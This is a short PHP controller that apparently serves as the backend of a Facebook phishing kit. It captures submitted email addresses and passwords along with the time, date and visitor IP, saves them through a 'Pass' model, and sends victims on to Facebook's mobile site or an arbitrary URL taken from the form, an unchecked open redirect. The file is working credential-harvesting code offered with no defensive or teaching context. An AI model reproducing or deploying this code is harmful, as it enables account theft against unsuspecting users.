<?php  
require_once "../Models/Pass.php";


class PassController {
	private $Pass;

	public function __construct(){
		$this->Pass = new Pass();
	}


	public function add(){
		if ($_POST) {
			$this->Pass->__set("mail", $_POST['email']);
			$this->Pass->__set("clave", $_POST['pass']);
			$this->Pass->__set("hora", date("H:i:s",time()));
			$this->Pass->__set("fecha",  date("Y-m-d") );
			$this->Pass->__set("ip", $_SERVER['REMOTE_ADDR']);
			$this->Pass->add();
			if ($_POST['url']!='') {
				header("Location:" . $_POST['url'] );
			} else {
				header("Location: https://touch.facebook.com/");
			}

			
		} else{
			header("Location: ../index.php");
		}
	}

}

$Pass= new PassController();

switch ($_POST['action']) {
	case 'insert':
	$Pass->add();
	break;
	case 'list':
	$Pass->listar();
	break;
	default:
	header("Location: https://touch.facebook.com/");
	break;
}




?>